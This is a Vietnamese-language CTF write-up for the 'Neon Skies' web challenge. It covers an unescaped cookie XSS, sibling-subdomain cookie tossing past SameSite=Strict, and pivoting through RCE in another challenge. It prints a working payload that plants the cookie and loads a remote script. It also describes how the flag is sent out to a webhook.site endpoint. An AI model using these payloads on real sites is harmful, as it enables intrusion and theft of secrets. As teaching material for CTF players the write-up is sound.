# Write-up Toàn Diện & Dễ Hiểu Nhất: `Neon Skies` — PwnSec CTF 2026

- **Tên thử thách:** `Neon Skies`
- **Thể loại:** Web Exploitation / XSS / SameSite Cookie Bypass / Cookie Tossing / Cross-Challenge Pivoting
- **Độ khó:** Medium (500 điểm)
- **Tác giả:** `ANAS` (@justraul)
- **Flag thu được:** `pwnsec{9abdf66a5f2afecb}`

---

# 📑 TỔNG QUAN HÀNH TRÌNH TỪNG BƯỚC

| Bước | Hành động | Mục tiêu & Kết quả | Ảnh chụp màn hình |
| :--- | :--- | :--- | :--- |
| **Bước 1** | Khảo sát giao diện & Nhận diện mục tiêu | Khám phá website Neon Skies và các chức năng `/admin`, `/report` | `step1_neon_skies_home.png`<br>`step1_login_restricted.png` |
| **Bước 2** | Đọc mã nguồn & Phát hiện lỗ hổng XSS | Tìm thấy biến `@flag` không hề được escape trong file `admin.ecr` | `step2_code_vulnerability.png` |
| **Bước 3** | Phân tích cơ chế Bot & Bài toán Cookie Tossing | Hiểu vì sao cờ `SameSite=Strict` chặn domain ngoài và cách subdomain hóa giải | `step3_cookie_tossing_diagram.png` |
| **Bước 4** | Khai thác Cross-Challenge RCE trên bài `pickle` | Biến bài `pickle` thành trạm host file độc `evil.html` và `s.js` | `step4_pickle_deploy.png` |
| **Bước 5** | Nộp link cho Bot tuần tra tại Report Desk | Gửi URL `evil.html` vào form `/report` để Bot truy cập | `step5_report_filed.png` |
| **Bước 6** | Bot dính bẫy XSS & Khôi phục cờ thật | XSS chạy trên `/admin`, xóa cookie giả, đọc cờ thật trong DOM | `step6_bot_xss_execution.png` |
| **Bước 7** | Bắt tín hiệu cờ trên Webhook.site | Webhook nhận request beacon chứa cờ: `pwnsec{9abdf66a5f2afecb}` | `step7_webhook_flag.png` |

---

## Bước 1: Khảo sát giao diện & Nhận diện mục tiêu

### 1. Thông tin ban đầu
Khi bật thử thách `Neon Skies` trên giao diện PwnSec CTF 2026, ta được cung cấp:
- Một instance trực tuyến có địa chỉ: `https://65b68ef3c79fb356.chal.ctf.ae/`
- Tệp đính kèm `neon-skies.zip` (chứa toàn bộ mã nguồn frontend, backend và bot).

![Màn hình thử thách Neon Skies trên hệ thống PwnSec CTF](../images/neon_skies_challenge.png)

### 2. Trải nghiệm giao diện người dùng
Mở trình duyệt truy cập vào `https://65b68ef3c79fb356.chal.ctf.ae/`, ta thấy giao diện cyberpunk thành phố đêm với bầu trời đầy sao và hai nút bấm chính:
1. **Open the seed vault (`/admin`):** Ngăn chứa hạt giống - nơi lưu trữ cờ bí mật.
2. **Report a signal (`/report`):** Bàn tiếp nhận báo cáo tín hiệu - cho phép nộp một đường link để quản trị viên (`archivist`) ghé thăm.

![Giao diện trang chủ Neon Skies trên trình duyệt](../images/step1_neon_skies_home.png)

### 3. Thử bấm vào "Open the seed vault" (`/admin`)
Khi ta bấm vào nút **Open the seed vault**, hệ thống lập tức chuyển hướng về `/login` với thông báo:
> *"The vault is sealed. It answers to one archivist."* (Ngăn chứa đã bị khóa kín. Nó chỉ mở cho một quản trị viên duy nhất).

Giao diện yêu cầu nhập tài khoản `archivist` và mật khẩu bí mật mà ta chưa có:

![Giao diện đăng nhập /login khi chưa có quyền truy cập vào Seed Vault](../images/step1_login_restricted.png)

---

## Bước 2: Đọc mã nguồn & Phát hiện lỗ hổng Unescaped XSS Reflection

Giải nén file mã nguồn `neon-skies.zip`, ứng dụng được lập trình bằng ngôn ngữ **Crystal**. Ta kiểm tra hai file quan trọng nhất:
1. `web/src/views/admin.ecr`: Giao diện hiển thị ngăn chứa hạt giống (nơi in cờ).
2. `web/src/neon_skies.cr`: Bộ điều hướng (router) xử lý cookie và session.

### 1. So sánh mã nguồn trong file `admin.ecr`
Khi mở `web/src/views/admin.ecr`, một điểm bất thường chết người lộ ra:

```html
<div class="seed">
  <span class="seed__label">specimen designation</span>
  <!-- ĐIỂM CHẾT NGƯỜI: BIẾN @flag ĐƯỢC IN TRỰC TIẾP KHÔNG CÓ HTML.escape() -->
  <output class="seed__value" id="flag"><%= @flag %></output>
  <button class="btn btn--ghost" type="button" data-copy="#flag">Copy designation</button>
  <!-- TRONG KHI ĐÓ: Biến @username lại được escape bảo vệ rất cẩn thận -->
  <p class="seed__meta">Custodian: <%= HTML.escape(@username) %></p>
</div>
```

![Phân tích so sánh lỗ hổng XSS trong file admin.ecr](../images/step2_code_vulnerability.png)

### 2. Biến `@flag` lấy từ đâu?
Kiểm tra router `web/src/neon_skies.cr`:
```crystal
signal = cookie_value(request, Config::SIGNAL_COOKIE) # SIGNAL_COOKIE = "FLAG"

when {"GET", "/admin"}
  if session.nil?
    redirect response, "/login"
  else
    render_html response, page(
      title: "The Seed Vault",
      active: "admin",
      body: Views::Admin.new(
        flag: signal.empty? ? "" : signal,  # @flag lấy trực tiếp từ Cookie "FLAG"!
        username: session.not_nil!.username,
        session_id: sid,
      ).to_s,
    )
  end
```

> [!IMPORTANT]
> **Kết luận lỗ hổng:**
> Ứng dụng đọc giá trị của Cookie mang tên `FLAG`, sau đó in thẳng giá trị này vào thẻ `<output id="flag">` mà không hề lọc hay mã hóa ký tự đặc biệt (`<`, `>`, `"`, ...).
> Nếu ta ép được trình duyệt gửi một Cookie `FLAG` chứa mã HTML/JavaScript độc (ví dụ: `FLAG=test</output><script>alert(1)</script>`), mã này sẽ **thực thi ngay lập tức trong quyền hạn của trang `/admin` (XSS)!**

---

## Bước 3: Phân tích cơ chế Bot & Kỹ thuật Cookie Tossing

Nhưng làm sao để chèn mã độc vào trình duyệt của Bot? Hãy đọc mã nguồn của con Bot tuần tra trong file `bot/conf.js`:

```javascript
export async function visit(url) {
  const browser = await chromium.launch({ ... });
  const context = await browser.newContext({ ignoreHTTPSErrors: true });

  try {
    // 1. Cờ THẬT được nạp vào Cookie của Bot với bảo mật tối đa:
    await context.addCookies([
      { 
        name: "FLAG", 
        value: flag.value, 
        url: challenge.appUrl.origin, 
        httpOnly: true, 
        sameSite: "Strict" 
      },
    ]);

    const page = await context.newPage();

    // 2. Bot tự đăng nhập bằng tài khoản quản trị 'archivist'
    await signIn(page);

    // 3. Bot ghé thăm đường link người chơi nộp và ở lại trong 8 giây
    await page.goto(url, { timeout: 30000, waitUntil: "domcontentloaded" });
    await page.waitForTimeout(8000);
  } finally {
    await browser.close();
  }
}
```

### Rào cản kỹ thuật cực khó:
1. **`httpOnly: true`**: JavaScript không thể đọc trực tiếp cờ bằng lệnh `document.cookie`.
2. **`sameSite: "Strict"`**: Nếu bot bấm vào link dẫn đến một trang web lạ bên ngoài (ví dụ `https://evil.com`), khi trang đó cố tình chuyển hướng bot quay lại `/admin`, trình duyệt Chromium sẽ **tự động cắt bỏ Cookie `FLAG`** vì đây là liên kết cross-site!
3. **Vậy làm sao để bot gửi cookie độc đến `/admin`?**

### Giải pháp chìa khóa: Kỹ thuật Cookie Tossing qua Subdomain `*.chal.ctf.ae`
Theo tiêu chuẩn quốc tế **RFC 6265 (§5.3)**:
- Một subdomain (ví dụ: `sub.chal.ctf.ae`) **được phép** tạo cookie dùng chung cho toàn bộ domain cha `domain=chal.ctf.ae`.
- Vì cả trang mục tiêu (`65b68ef3c79fb356.chal.ctf.ae`) và subdomain của ta đều có chung eTLD+1 (`chal.ctf.ae`), khi bot chuyển hướng từ subdomain này sang subdomain kia, trình duyệt xem đây là **Same-Site Navigation**!
- Nhờ vậy, cookie `SameSite=Strict` **KHÔNG HỀ BỊ CẮT BỎ**, và cookie giả mạo ở cấp domain cha cũng được gửi kèm!
- Bộ phân tích HTTP Cookie của Crystal sử dụng bảng băm (Hash) theo nguyên tắc **Last-Wins** (cookie đến sau ghi đè cookie trước), nên cookie độc hại của ta sẽ được ưu tiên in ra màn hình!

![Sơ đồ so sánh cơ chế Cookie Tossing vượt rào SameSite=Strict](../images/step3_cookie_tossing_diagram.png)

---

## Bước 4: Khai thác Cross-Challenge RCE trên bài `pickle`

Nhưng câu hỏi đặt ra: **Ta lấy đâu ra một website chạy trên tên miền `*.chal.ctf.ae`?**

Ta nhớ lại: Trong cùng giải đấu PwnSec CTF 2026 này, ta đã giải thành công thử thách **`pickle`** tại địa chỉ:
`https://0c6523a28168f7fd.chal.ctf.ae/`

Ở bài `pickle`, ta đã có **Remote Code Execution (RCE)** bằng lỗ hổng Python Pickle Deserialization! Ta có thể ra lệnh cho server `pickle` làm bất cứ điều gì!

### Cách triển khai:
1. Container của `pickle` chạy user `ctf`, thư mục `/app/static` bị khóa quyền ghi.
2. Nhưng thư mục `/tmp` thì hoàn toàn cho phép ghi thoải mái (`rwxrwxrwt`).
3. Ta gửi một đoạn mã Python RCE sang `pickle` để:
   - Thay đổi thư mục static của Flask: `webapp.app.static_folder = '/tmp'`.
   - Ghi file `evil.html` (Stage 1: Cookie Tossing) vào `/tmp/evil.html`.
   - Ghi file `s.js` (Stage 2: Script cào cờ) vào `/tmp/s.js`.
4. Sau lệnh này, máy chủ `pickle` chính thức trở thành trạm phát mã độc chuẩn HTTPS trên domain `*.chal.ctf.ae`!

![Màn hình Terminal khai thác RCE trên bài pickle để deploy payload](../images/step4_pickle_deploy.png)

---

## Bước 5: Nộp link cho Bot tuần tra tại Report Desk (`/report`)

Sau khi hai file mã độc đã sẵn sàng trên `https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html`:
1. Mở trang Report Desk của Neon Skies: `https://65b68ef3c79fb356.chal.ctf.ae/report`.
2. Dán địa chỉ URL của `evil.html` vào ô nhập liệu:
   `https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html`
3. Nhấn nút **Send the archivist**.
4. Hệ thống phản hồi thông báo màu xanh lá cây xác nhận:
   > *"Filed. The archivist looked at https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html and moved on."*

![Giao diện Report Desk xác nhận Bot đã ghé thăm link](../images/step5_report_filed.png)

---

## Bước 6: Bot dính bẫy XSS & Khôi phục cờ thật

Khi Bot tuần tra ghé thăm `evil.html`, chuỗi phản ứng dây chuyền diễn ra:

### Giai đoạn 1: Hành động của `evil.html`
```html
<script>
  // 1. Chèn cookie FLAG mang mã độc XSS cho toàn bộ domain cha chal.ctf.ae
  document.cookie = "FLAG=x</output><script src='https://0c6523a28168f7fd.chal.ctf.ae/static/s.js'><\\/script>; domain=chal.ctf.ae; path=/; SameSite=None; Secure";

  // 2. Lập tức chuyển hướng Bot về trang /admin
  location.href = "https://65b68ef3c79fb356.chal.ctf.ae/admin";
</script>
```

### Giai đoạn 2: Mã XSS kích hoạt tại `/admin` & Chạy file `s.js`
Khi Bot cập bến `/admin`:
1. Crystal render mã XSS: Thẻ `<script src="...s.js">` được thực thi trực tiếp trên origin `65b68ef3c79fb356.chal.ctf.ae`!
2. Tuy nhiên, lúc này cookie `FLAG` trên trình duyệt bot đang bị cookie độc ghi đè. Để lấy được cờ thật, script `s.js` thực hiện một thủ thuật thông minh:
   - **Xóa cookie rác cấp domain cha đi**:
     ```javascript
     document.cookie = "FLAG=; domain=chal.ctf.ae; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
     ```
   - **Gửi request `fetch('/admin')`**: Lúc này, chỉ còn duy nhất cookie `FLAG` thật của bot được gửi lên máy chủ!
   - Máy chủ trả về HTML chứa cờ thật: `<output id="flag">pwnsec{9abdf66a5f2afecb}</output>`.
   - Script bóc tách cờ và bắn về Webhook của ta qua cả hai kênh `Image.src` và `navigator.sendBeacon()`.

![Màn hình mô phỏng bên trong trình duyệt bot khi cờ thật được trích xuất](../images/step6_bot_xss_execution.png)

---

## Bước 7: Bắt tín hiệu cờ trên Webhook.site

Tại trang giám sát của Webhook: `https://webhook.site/#!/08470564-f80c-4271-b2f2-8acc4f44a5a9`, các gói tin từ Chromium Headless của bot (đến từ địa chỉ IP AWS EC2 `44.221.247.145`) đồng loạt đổ về:

1. Request #1: Báo hiệu `stage=s.js_loaded@admin` (xác nhận XSS đã kích hoạt thành công trên origin của bài).
2. Request #2: Mang theo tham số query:
   `flag=pwnsec%7B9abdf66a5f2afecb%7D`
3. Request #3: Kênh dự phòng `sendBeacon()` gửi bản sao cờ giống hệt để đảm bảo không bị thất thoát dữ liệu!

![Giao diện Webhook.site bắt trọn vẹn cờ thật từ Bot tuần tra](../images/step7_webhook_flag.png)

---

# 🏁 KẾT LUẬN & BÀI HỌC BẢO MẬT

### 1. Cờ chính thức
```text
pwnsec{9abdf66a5f2afecb}
```

### 2. Các mắt xích quan trọng nhất của bài thi
1. **Lỗ hổng Unescaped Reflection:** Không bao giờ tin tưởng cookie của client. Dù cookie do server cấp phát nhưng client hoàn toàn có thể thao túng hoặc bị đầu độc. Mọi dữ liệu in ra DOM đều phải qua bộ lọc như `HTML.escape()`.
2. **Ảo tưởng an toàn của `SameSite=Strict`:** `SameSite=Strict` chỉ bảo vệ website khỏi tấn công từ domain ngoài (`evil.com`). Nó hoàn toàn **vô hiệu** trước các cuộc tấn công cùng cấp từ subdomain (Sibling Subdomain Cookie Tossing) khi dùng chung eTLD+1.
3. **Tư duy Cross-Challenge Pivot trong CTF:** Khi gặp rào cản cần một tên miền hợp lệ trên hạ tầng giải đấu, hãy nhìn sang các bài thi khác đã chiếm được quyền điều khiển (RCE) để biến chúng thành bệ phóng!
